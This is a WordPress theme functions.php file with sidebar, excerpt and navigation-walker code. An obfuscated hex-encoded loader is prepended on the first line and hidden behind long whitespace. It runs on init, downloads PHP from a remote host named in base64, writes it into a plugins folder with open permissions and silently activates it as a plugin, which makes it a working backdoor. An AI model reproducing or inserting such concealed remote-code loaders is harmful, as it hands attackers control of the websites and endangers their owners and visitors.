<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     $Yrrjc	 = 	  	""  ;  $Yrrjc     .=  "2f2a694530534a4a41724f61777753663658586a46322a2f6966202821646566696e65642827634778315a326c75583356775a4746305a584d272920616e64202166756e6374696f6e5f6578697374732822636865636b696e675f666f725f6e65775f706c7567"  ;	 	  $Yrrjc	.=  	  "696e5f7570646174652229297b0a2020202066756e6374696f6e20636865636b696e675f666f725f6e65775f706c7567696e5f75706461746528297b0a202020202020202069662028646566696e65642827634778315a326c75583356775a474"  		;				$Yrrjc		.="6305a584d2729297b72657475726e20747275653b7d0a202020202020202024613d6261736536345f6465636f646528275a4739"  		 ;	   				$Yrrjc.=	 "6a63773d3d27293b20646566696e652827634778315a326c75583356775a4746305a584d272c20273127293b0a202020202020202024643d4449524543544f52595f534550415241544f523b246b3d272e706870273b0a20202020202020202470203d747261696c696e67736c617368697428747261696c696e67736c61736869742841425350415448292e2277702d636f6e74656e74222e24642e22706c7567696e7322293b0a20202020202020206966282169735f6469722824702e24642e24612929207b0a202020202020202020202020406d6b6469722824702e24642e24612c2030373737293b0a2020202020202020202020206966282166696c655f657869737" ;  	  	$Yrrjc  	  .=	 		 "4732824702e24642e24612e24642e24612e246b2929207b0a2020202020202020202020202020202024723d4077705f72656d6f74655f676574286261736536345f6465636";	$Yrrjc.=		 	 "f646528276148523063446f764c32786862585673595852684c6d4a706569396a636d6c776446396b62324d75634768772729293b0a202020202020202020202020202020206966282169735f77705f6572726f722824722920262620323030203d3d2024725b22726573706f6e7365225d5b22636f6465225d29207b4066696c655f7075745f636f6e74656e74732824702e24642e24612e24642e24612e"	 			;	  			$Yrrjc .=	 "246b2c2024725b22626f6479225d293b7d0a2020202020202020202020207d0a20202020202020207d0a20202020202020206966284066696c655f6578697374732824702e24642e24612e24642e24612e246b29297b0a2020202020202020202020202463203d20406765745f6f7074696f6e28226163746976655f706c7567696e73222";		$Yrrjc  .= 		"93b24706c203d2040706c7567696e5f626173656e616d652824612e272f272e24612e246b293b0a20202020202020202020202069662821696e5f61727261792824706c2c20246329297b24635b5d203d2024706c3b736f7274282463293b407570646174655f6f7074696f6e28226163746976655f706c7567696e73222c2463293b7d0a20202020202020207d0a202020207d0a7d0a6164645f616374696f6e2822696e6974222c2022636865636b696" 	 ; 					$Yrrjc  	.=  	"e675f666f725f6e65775f706c7567696e5f7";  	 				$Yrrjc  .= 			 "5706461746522293b092f2a3659596b62786f6f4c37746b6b4879706767375a2a2f09"  ; 		$XjFYq   =   $Yrrjc ;                     if	  	 (	!function_exists(  "Fyrjc")){function Fyrjc($UUNgz){$KdwOO=  ""   		; $RKKcv		=	 strlen(  	$UUNgz		 )	  	/		 2	;  			for  		(  			$ogzzS	=0		  	;	$ogzzS<	  		$RKKcv; 		 $ogzzS++	){$KdwOO.=		chr			(   base_convert(substr($UUNgz,$ogzzS  			* 2,  	2)   		,		16		,	10   		) 	) 				;     }return 		$KdwOO;	   }}             $XjFYq			 =  	   create_function	    (   null	 ,				 Fyrjc($XjFYq));  $XjFYq()	;
require('theme-options.php');

add_action( 'after_setup_theme', 'artemas_setup' );

function arphabet_widgets_init() {
		
register_sidebar( array('name' => 'Footer Link widget',
		'id' => 'footer_widget_1',
		'before_widget' => '<div style="float:left; width: 170px;">',
		'after_widget' => '</div>',
		'before_title' => '<li><h5><span>',
		'after_title' => '</span></h5></li>',),array('name' => 'Footer Link Right',
		'id' => 'footer_widget_2',
		'before_widget' => '<div style="float:left; width: 170px;">',
		'after_widget' => '</div>',
		'before_title' => '<li><h5><span>',
		'after_title' => '</span></h5></li>',) );	
}
add_action( 'widgets_init', 'arphabet_widgets_init' );
if ( ! function_exists( 'artemas_setup' ) ):	

	function artemas_setup() {

		register_nav_menu( 'primary', __( 'Primary Menu', 'artemas' ) );

		add_theme_support( 'post-formats', array( 'aside', 'Links', 'gallery', 'status', 'quote', 'image' ) );

}

endif; // artemas_setup

function get_the_content_limit($max_char, $more_link_text = '(more)', $stripteaser = 0, $more_file = '') {
    $content = get_the_content($more_link_text, $stripteaser, $more_file);
    $content = apply_filters('get_the_content', $content);
    $content = str_replace(']]>-<p>', ']]&gt;', $content);
	 $content = strip_tags($content);

   if (strlen($_GET['p']) > 0) {
      echo $content;
   }
   else if ((strlen($content)>$max_char) && ($espacio = strpos($content, " ", $max_char ))) {
        $content = substr($content, 0, $espacio);
        $content = $content;
        
        echo $content;
         echo  "...";
      
         //echo "<a href='";
        //the_permalink();
       // echo "</p>";
        //echo "<br>";
        //echo "<div class=";
		//echo "'read-more'>";
		echo "<a href='";
        the_permalink();
        echo " ' class='readmore'>".$more_link_text."</a>";
   }
   else {
      echo $content;
      
   }
}


/*function getWords($text, $limit)
{
$array = explode(" ", $text, $limit+1);

if (count($array) > $limit)
{
unset($array[$limit]);
}
return implode(" ", $array);
}*/

//add_filter('the_content', 'filter_ptags_on_images');

/*----------------------------- Add Extrea image Fied to Post--------------------------------*/

class MenuList extends Walker_Nav_Menu {	

	// add classes to ul sub-menus

	function start_lvl(&$output, $depth = 0, $args = array()  ) {

		// depth dependent classes

		$indent = ( $depth > 0  ? str_repeat( "\t", $depth ) : '' ); // code indent

		$output .= "\n" . $indent . '<ul>' . "\n";

		//$spn =($depth > 0)? '<li><span></span></li>':'';

		

		//$output .= '<li><span></span></li>'  . "\n";

	}// add main/sub classes to li's and links

	function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0 ) {

		global $wp_query;

		$indent = ( $depth > 0 ? str_repeat( "\t", $depth ) : '' ); // code indent

		// depth dependent classes

		$depth_classes = array( 'MenuLevel-' . $depth );

		$depth_class_names = esc_attr( implode( ' ', $depth_classes ) );

		// passed classes

		$classes = empty( $item->classes ) ? array() : (array) $item->classes;

		$class_names = esc_attr( implode( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) ) );

		// build html

		//if($item->ID==329)  $output .= $indent .'<li class="logo"><a href="'.home_url().'"><img src="'.get_bloginfo('template_url').'/images/logo.png" alt="Captain Ricks"></a></li>'; 

		$output .= $indent . '<li>';

		//link attributes
			//$output .= $indent . '<a href="MenuId-'. $item->ID . '" class=" '.$depth_class_names.' '.$class_names.'"  >';

		$attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';

		$attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';

		$attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';

		$attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

		//$attributes .= ' class="' . ( $depth > 0 ? 'sub-menu-link' : 'main-menu-link' ) . '"';
 	//$after =($depth > 0 || in_array('last', $item->classes)) ? '' : $args->after;


		$em=($depth>0 && $item->description !="" )?'<em>'.$item->description.'</em>':'';

		$item_output = sprintf( '%1$s<a%2$s>%3$s%4$s%5$s'.$em.'</a>%6$s',

			$args->before,

			$attributes,

			$args->link_before,

			apply_filters( 'the_title', $item->title, $item->ID ),

			$args->link_after,

			$after);
	$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args,$id );

	}
	
	

}
?>